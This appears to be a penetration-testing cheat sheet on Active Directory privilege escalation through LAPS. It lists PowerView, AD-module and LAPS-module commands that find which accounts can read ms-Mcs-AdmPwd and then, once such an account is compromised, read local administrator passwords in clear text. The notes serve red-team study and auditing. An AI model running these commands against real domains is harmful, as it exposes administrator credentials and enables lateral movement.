# Domain Privilege Escalation [ LAPS ]
## Methodology/Steps

> 1. Identify the user who can read the LAPS creds
> 2. Identify the OU where LAPS is implemented and which user can read it
> 3. After compromising the user who can read the LAPS, read the creds

---

## PowerView 
### 1. To find users who can read the passwords in clear text machines in OUs
```powershell
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
```

### 2. To enumerate OUs where LAPS is in use along with users who can read the passwords in clear text
```powershell
# Using Active Directory module
.\Get-LapsPermissions.ps1

# Using LAPS module (can be copied across machines)
Import-Module C:\AD\Tools\AdmPwd.PS\AdmPwd.PS.psd1
Find-AdmPwdExtendedRights -Identity OUDistinguishedName
```

### 3. Once we compromise the user which has the Rights, use the following to read clear-text password
```powershell
# Powerview
Get-DomainObject -Identity <identity> | select - ExpandProperty ms-mcs-admpwd

# Active Directory module
Get-ADComputer -Identity <identity> -Properties ms-mcs-admpwd | select -ExpandProperty ms-mcs-admpwd

# LAPS module
Get-AdmPwdPassword -ComputerName <computrt-name>
```
